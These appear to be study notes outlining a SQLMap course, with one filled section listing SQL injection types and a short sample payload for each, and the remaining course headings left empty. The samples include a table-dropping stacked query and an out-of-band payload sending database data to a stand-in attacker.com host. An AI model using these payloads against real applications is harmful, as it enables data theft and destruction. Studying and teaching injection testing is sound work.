# Getting Started

## SQLMap Overview

This section covers how to install sqlmap and the different types of sql injection it allows you to use.

SQLMap covers:
Boolean-based blind SQL Injection
An example of this inject would be 
``` sql
AND 1=1
```

Error-based SQL Injection
An example of this injection would be 
``` sql
AND GTID_SUBSET(@@version,0)
```
This is the second fastest injection

UNION query-based
An example of this injection would be 
``` sql 
UNION ALL SELECT 1,@@version,3
```
This is the fastest and best injection

Stacked queries
An example of this 
``` sql
; DROP TABLE users
```

Time-based blind SQL Injection
Example 
``` sql 
AND 1=IF(2>1,SLEEP(5),0)
```

Inline queries
Example 
``` sql
SELECT (SELECT @@version) from
```

Out-of-band SQL Injection
Example 
``` sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

## Getting Started with SQLMap

## SQLMap Output Description

# Building Attacks

## Running SQLMap on an HTTP Request

## Handling SQLMap Errors

## Attack Tuning

# Database Enumeration

## Database Enumeration

## Advanced Database Enumneration

# Advanced SQLMap Usage

## Bypasswing Web Application Protections

## OS Exploitations

# Skills Assessment

## Skills Assessment
